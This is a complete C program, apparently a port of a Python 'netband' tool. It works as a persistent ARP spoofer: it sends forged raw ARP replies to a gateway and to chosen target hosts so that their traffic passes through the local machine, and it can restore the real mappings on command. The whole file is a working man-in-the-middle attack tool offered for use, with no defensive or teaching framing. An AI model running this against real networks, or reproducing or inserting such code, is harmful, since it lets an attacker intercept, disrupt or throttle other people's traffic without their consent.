/*
 * netband_arp - persistent root-level bidirectional ARP spoofer.
 * Port of the raw-socket logic in the original netband.py (Spoofer class).
 *
 * Usage:
 *   netband_arp <iface> <local_mac> <local_ip> <gw_mac> <gw_ip>
 *
 * Control protocol via stdin (one command per line):
 *   ADD <ip> <mac>   start spoofing this target (MITM between it and the gateway)
 *   DEL <ip>         stop spoofing + restore real ARP entries for this target
 *   QUIT             restore everything and exit
 *
 * Requires AF_PACKET/SOCK_RAW, i.e. must run as root (su).
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>

#define MAX_TARGETS 256

typedef struct {
    char ip[16];
    unsigned char mac[6];
    int used;
} target_t;

static target_t targets[MAX_TARGETS];
static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
static int sock = -1;
static int ifindex = 0;
static unsigned char local_mac[6];
static unsigned char gw_mac[6];
static char gw_ip[16];
static char iface_name[IFNAMSIZ];
static volatile int running = 1;

static void mac_parse(const char *s, unsigned char *out) {
    unsigned int b[6];
    sscanf(s, "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]);
    for (int i = 0; i < 6; i++) out[i] = (unsigned char) b[i];
}

/* Build and send one ARP frame: eth_dst/src from local, arp src/dst pairs. */
static void send_arp(const unsigned char *eth_dst, const unsigned char *arp_src_mac,
                      const char *arp_src_ip, const unsigned char *arp_dst_mac,
                      const char *arp_dst_ip, int op) {
    unsigned char buf[42];
    memset(buf, 0, sizeof(buf));

    memcpy(buf, eth_dst, 6);
    memcpy(buf + 6, local_mac, 6);
    buf[12] = 0x08; buf[13] = 0x06; /* ethertype ARP */

    buf[14] = 0x00; buf[15] = 0x01; /* htype ethernet */
    buf[16] = 0x08; buf[17] = 0x00; /* ptype IPv4 */
    buf[18] = 6; buf[19] = 4;       /* hlen, plen */
    buf[20] = 0; buf[21] = (unsigned char) op;

    memcpy(buf + 22, arp_src_mac, 6);
    struct in_addr a; inet_aton(arp_src_ip, &a);
    memcpy(buf + 28, &a.s_addr, 4);

    memcpy(buf + 32, arp_dst_mac, 6);
    struct in_addr b; inet_aton(arp_dst_ip, &b);
    memcpy(buf + 38, &b.s_addr, 4);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = ifindex;
    sa.sll_halen = ETH_ALEN;
    memcpy(sa.sll_addr, eth_dst, 6);

    sendto(sock, buf, sizeof(buf), 0, (struct sockaddr *) &sa, sizeof(sa));
}

/* MITM: tell gateway "target_ip is at local_mac", tell target "gw_ip is at local_mac". */
static void spoof_pair(target_t *t) {
    send_arp(gw_mac, local_mac, t->ip, gw_mac, gw_ip, 2);
    send_arp(t->mac, local_mac, gw_ip, t->mac, t->ip, 2);
}

/* Restore real ARP mappings so traffic flows normally again. */
static void restore_pair(target_t *t) {
    for (int i = 0; i < 3; i++) {
        send_arp(gw_mac, t->mac, t->ip, gw_mac, gw_ip, 2);
        send_arp(t->mac, gw_mac, gw_ip, t->mac, t->ip, 2);
        usleep(100000);
    }
}

static void *spoof_loop(void *arg) {
    (void) arg;
    while (running) {
        pthread_mutex_lock(&lock);
        for (int i = 0; i < MAX_TARGETS; i++)
            if (targets[i].used) spoof_pair(&targets[i]);
        pthread_mutex_unlock(&lock);
        sleep(2);
    }
    return NULL;
}

static void add_target(const char *ip, const char *mac) {
    pthread_mutex_lock(&lock);
    for (int i = 0; i < MAX_TARGETS; i++) {
        if (!targets[i].used) {
            strncpy(targets[i].ip, ip, 15);
            targets[i].ip[15] = 0;
            mac_parse(mac, targets[i].mac);
            targets[i].used = 1;
            break;
        }
    }
    pthread_mutex_unlock(&lock);
}

static void del_target(const char *ip) {
    pthread_mutex_lock(&lock);
    for (int i = 0; i < MAX_TARGETS; i++) {
        if (targets[i].used && strcmp(targets[i].ip, ip) == 0) {
            target_t copy = targets[i];
            targets[i].used = 0;
            pthread_mutex_unlock(&lock);
            restore_pair(&copy);
            return;
        }
    }
    pthread_mutex_unlock(&lock);
}

int main(int argc, char **argv) {
    if (argc < 6) {
        fprintf(stderr, "usage: %s <iface> <local_mac> <local_ip> <gw_mac> <gw_ip>\n", argv[0]);
        return 1;
    }
    strncpy(iface_name, argv[1], IFNAMSIZ - 1);
    mac_parse(argv[2], local_mac);
    /* argv[3] local_ip currently unused directly but kept for symmetry/debug */
    mac_parse(argv[4], gw_mac);
    strncpy(gw_ip, argv[5], 15);
    gw_ip[15] = 0;

    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) { perror("socket"); return 1; }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface_name, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) { perror("ioctl"); return 1; }
    ifindex = ifr.ifr_ifindex;

    pthread_t th;
    pthread_create(&th, NULL, spoof_loop, NULL);

    char line[128];
    while (running && fgets(line, sizeof(line), stdin)) {
        char cmd[8] = {0}, ip[16] = {0}, mac[32] = {0};
        int n = sscanf(line, "%7s %15s %31s", cmd, ip, mac);
        if (n == 3 && strcmp(cmd, "ADD") == 0) {
            add_target(ip, mac);
        } else if (n >= 2 && strcmp(cmd, "DEL") == 0) {
            del_target(ip);
        } else if (strncmp(line, "QUIT", 4) == 0) {
            running = 0;
        }
    }

    pthread_mutex_lock(&lock);
    for (int i = 0; i < MAX_TARGETS; i++) {
        if (targets[i].used) {
            target_t copy = targets[i];
            targets[i].used = 0;
            pthread_mutex_unlock(&lock);
            restore_pair(&copy);
            pthread_mutex_lock(&lock);
        }
    }
    pthread_mutex_unlock(&lock);
    close(sock);
    return 0;
}
